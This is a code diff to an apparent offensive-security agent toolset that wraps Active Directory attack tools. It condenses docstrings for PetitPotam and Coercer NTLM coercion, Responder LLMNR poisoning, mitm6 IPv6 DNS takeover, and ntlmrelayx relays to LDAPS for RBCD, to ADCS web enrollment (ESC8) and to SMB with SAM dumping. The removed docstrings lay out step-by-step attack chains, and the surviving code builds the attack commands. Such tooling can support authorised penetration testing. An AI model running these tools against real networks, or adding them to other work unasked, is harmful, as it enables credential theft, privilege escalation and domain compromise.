@@ -40,28 +40,7 @@ class CoercionTools(Toolset):
         password: str = "",
         domain: str = "",
     ) -> str:
-        """
-        Coerce NTLM authentication using PetitPotam (MS-EFSRPC).
-
-        PetitPotam forces a target to authenticate to your listener via EFSRPC.
-        Works unauthenticated on many unpatched systems, or authenticated on patched ones.
-
-        Use with ntlmrelayx to relay the authentication to LDAPS for RBCD/shadow creds.
-
-        Args:
-            target: Target machine IP to coerce
-            listener: Your listener IP (where auth will be sent)
-            username: Username for authenticated coercion (optional)
-            password: Password for authentication (optional)
-            domain: Domain for authentication (optional)
-
-        Returns:
-            PetitPotam coercion result
-
-        Example:
-            >>> petitpotam("192.168.58.10", "192.168.58.100")  # unauthenticated
-            >>> petitpotam("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
-        """
+        """Coerce NTLM auth via MS-EFSRPC. Use with ntlmrelayx for relay attacks."""
         # Use coercer with MS-EFSR filter (same as PetitPotam) since petitpotam.py
         # may not be installed. Coercer is more reliable and widely available.
         cmd = [
@@ -108,25 +87,7 @@ class CoercionTools(Toolset):
         password: str = "",
         domain: str = "",
     ) -> str:
-        """
-        Coerce NTLM authentication using multiple methods (Coercer).
-
-        Coercer is a comprehensive coercion tool that tries multiple RPC methods
-        to force outbound authentication. More methods than PetitPotam alone.
-
-        Args:
-            target: Target machine IP to coerce
-            listener: Your listener IP (where auth will be sent)
-            username: Username for authentication (optional)
-            password: Password for authentication (optional)
-            domain: Domain for authentication (optional)
-
-        Returns:
-            Coercer results
-
-        Example:
-            >>> coercer("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
-        """
+        """Try multiple RPC coercion methods (MS-EFSR, MS-RPRN, MS-DFSNM, etc.)."""
         cmd = ["coercer", "coerce", "-t", target, "-l", listener]
 
         if username and password:
@@ -172,23 +133,7 @@ class CoercionNetworkTools(Toolset):
         interface: str = "",
         analyze_mode: bool = False,
     ) -> str:
-        """
-        Start Responder to capture NTLM hashes from network traffic.
-
-        Responder poisons LLMNR, NBT-NS, and MDNS to capture NTLM hashes
-        from machines looking for network resources.
-
-        Args:
-            interface: Network interface to listen on (auto-detected if empty)
-            analyze_mode: If True, only analyze without poisoning (safer)
-
-        Returns:
-            Responder status
-
-        Example:
-            >>> start_responder("ens5")
-            >>> start_responder("ens5", analyze_mode=True)
-        """
+        """Poison LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes."""
         from ares.core.config import get_default_network_interface
 
         if not interface:
@@ -220,24 +165,7 @@ class CoercionNetworkTools(Toolset):
         domain: str,
         interface: str = "",
     ) -> str:
-        """
-        Start mitm6 for IPv6 DNS takeover attacks.
-
-        mitm6 exploits the default IPv6 settings in Windows to become a
-        rogue DHCPv6 server and DNS server, enabling credential theft.
-
-        Use with ntlmrelayx for complete attack chain.
-
-        Args:
-            domain: Target domain for DNS takeover
-            interface: Network interface to listen on (auto-detected if empty)
-
-        Returns:
-            mitm6 status
-
-        Example:
-            >>> start_mitm6("domain.local", "ens5")
-        """
+        """IPv6 DNS takeover via DHCPv6. Use with ntlmrelayx for relay."""
         from ares.core.config import get_default_network_interface
 
         if not interface:
@@ -265,24 +193,7 @@ class CoercionNetworkTools(Toolset):
         dc_ip: str,
         delegate_access: bool = True,
     ) -> str:
-        """
-        Start ntlmrelayx to relay NTLM auth to LDAPS for RBCD/shadow creds.
-
-        Relays captured NTLM authentication to LDAPS for privilege escalation.
-        With --delegate-access, creates machine account for RBCD attack.
-
-        Combine with coercion tools (petitpotam, coercer) for full attack.
-
-        Args:
-            dc_ip: Domain controller IP to relay to
-            delegate_access: Enable RBCD delegation attack (default: True)
-
-        Returns:
-            ntlmrelayx status
-
-        Example:
-            >>> ntlmrelayx_to_ldaps("192.168.58.10")
-        """
+        """Relay to LDAPS for RBCD attack. Creates machine account with --delegate-access."""
         cmd = ["ntlmrelayx.py", "-t", f"ldaps://{dc_ip}", "--no-smb-server"]
 
         if delegate_access:
@@ -309,24 +220,7 @@ class CoercionNetworkTools(Toolset):
         ca_host: str,
         template: str = "DomainController",
     ) -> str:
-        """
-        Start ntlmrelayx to relay to ADCS Web Enrollment (ESC8).
-
-        Relays captured NTLM auth to the ADCS HTTP enrollment endpoint
-        to request certificates as the relayed user/machine.
-
-        Combine with coercion against a DC to get domain admin cert.
-
-        Args:
-            ca_host: Certificate Authority hostname/IP
-            template: Certificate template to request (default: DomainController)
-
-        Returns:
-            ntlmrelayx status
-
-        Example:
-            >>> ntlmrelayx_to_adcs("CA01.domain.local", "DomainController")
-        """
+        """ESC8 relay to ADCS web enrollment. Coerce DC to get its certificate."""
         cmd = [
             "ntlmrelayx.py",
             "-t",
@@ -359,34 +253,7 @@ class CoercionNetworkTools(Toolset):
         socks: bool = True,
         interactive: bool = False,
     ) -> str:
-        """
-        Start ntlmrelayx to relay NTLM auth to SMB on hosts without SMB signing.
-
-        IMPORTANT: Only works against hosts where SMB signing is NOT required.
-        Use smb_signing_check first to identify relay targets.
-
-        Relays captured NTLM authentication to SMB, enabling:
-        - SOCKS proxy for tools like secretsdump
-        - Interactive shell execution
-        - SAM/LSA dump on successful relay
-
-        Attack workflow:
-        1. Identify SMB signing disabled hosts (smb_signing_check)
-        2. Start this relay targeting those hosts
-        3. Use coercion (petitpotam/coercer) to trigger auth from a privileged source
-        4. Use relayed session via SOCKS or capture dumped hashes
-
-        Args:
-            target_ip: IP of host with SMB signing disabled
-            socks: Enable SOCKS proxy for relayed sessions (default: True)
-            interactive: Enable interactive SMB shell (default: False)
-
-        Returns:
-            ntlmrelayx status
-
-        Example:
-            >>> ntlmrelayx_to_smb("192.168.58.50")
-        """
+        """Relay to SMB (requires signing disabled). SOCKS proxy for secretsdump."""
         cmd = [
             "ntlmrelayx.py",
             "-t",
@@ -433,23 +300,7 @@ class CoercionNetworkTools(Toolset):
         target_ips: str | None = None,
         dump_sam: bool = True,
     ) -> str:
-        """
-        Start ntlmrelayx to relay to multiple SMB targets simultaneously.
-
-        For attacking multiple hosts with SMB signing disabled.
-        Provide either a targets file or comma-separated IPs.
-
-        Args:
-            targets_file: Path to file containing target IPs (one per line)
-            target_ips: Comma-separated list of target IPs
-            dump_sam: Automatically dump SAM on successful relay (default: True)
-
-        Returns:
-            ntlmrelayx status
-
-        Example:
-            >>> ntlmrelayx_multirelay(target_ips="192.168.58.50,192.168.58.51")
-        """
+        """Relay to multiple SMB targets. Provide targets_file or comma-separated target_ips."""
         if not targets_file and not target_ips:
             return "Error: Provide either targets_file or target_ips"
 
